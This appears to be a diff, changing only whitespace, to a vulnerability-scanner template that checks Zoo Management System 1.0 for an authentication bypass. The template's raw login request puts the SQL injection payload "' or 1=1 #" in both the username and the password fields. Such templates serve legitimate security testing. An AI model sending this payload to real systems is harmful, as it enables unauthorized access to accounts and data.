@@ -1,11 +1,9 @@
 id: zms-auth-bypass
-
 info:
   name: Zoo Management System 1.0 - Authentication Bypass
   author: dwisiswant0
   severity: high
   refernce: https://www.exploit-db.com/exploits/48880
-
 requests:
   - raw:
       - |
@@ -22,7 +20,6 @@ requests:
         Upgrade-Insecure-Requests: 1
 
         username=dw1%27+or+1%3D1+%23&password=dw1%27+or+1%3D1+%23&login=
-
     redirects: true
     max-redirects: 1
     matchers-condition: and
